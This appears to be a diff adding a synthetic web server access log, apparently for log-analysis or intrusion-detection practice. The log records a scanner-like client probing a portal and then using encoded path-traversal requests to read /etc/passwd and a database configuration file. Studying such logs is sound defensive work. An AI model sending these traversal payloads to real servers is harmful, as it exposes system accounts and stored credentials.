@@ -1,0 +1,35 @@
+203.0.113.120 - - [21/Mar/2025:10:32:58 +0900] 
+"GET / HTTP/1.1" 200 3523
+Host: web-portal01.intra-sec.local
+User-Agent: CorpScanner/4.3
+Referer: -
+
+203.0.113.120 - - [21/Mar/2025:10:33:01 +0900] 
+"GET /login HTTP/1.1" 200 1482
+Host: web-portal01.intra-sec.local
+User-Agent: CorpScanner/4.3
+Referer: https://intra-auth01.intra-sec.local/
+
+203.0.113.120 - - [21/Mar/2025:10:33:05 +0900] 
+"GET /cgi-bin/test.cgi HTTP/1.1" 404 298
+Host: web-portal01.intra-sec.local
+User-Agent: CorpScanner/4.3
+Referer: https://intra-auth01.intra-sec.local/login
+
+203.0.113.120 - - [21/Mar/2025:10:33:08 +0900] 
+"GET /cgi-bin/.%2e/%2e%2e/ HTTP/1.1" 403 522
+Host: web-portal01.intra-sec.local
+User-Agent: CorpScanner/4.3
+Referer: https://intra-auth01.intra-sec.local/login
+
+203.0.113.120 - - [21/Mar/2025:10:33:10 +0900] 
+"GET /cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 200 842
+Host: web-portal01.intra-sec.local
+User-Agent: CorpScanner/4.3
+Referer: https://intra-auth01.intra-sec.local/login
+
+203.0.113.120 - - [21/Mar/2025:10:33:12 +0900] 
+"GET /cgi-bin/.%2e/%2e%2e/%2e%2e/var/www/intra-sec/config/db_config.yml HTTP/1.1" 200 1164
+Host: web-portal01.intra-sec.local
+User-Agent: CorpScanner/4.3
+Referer: https://intra-auth01.intra-sec.local/login
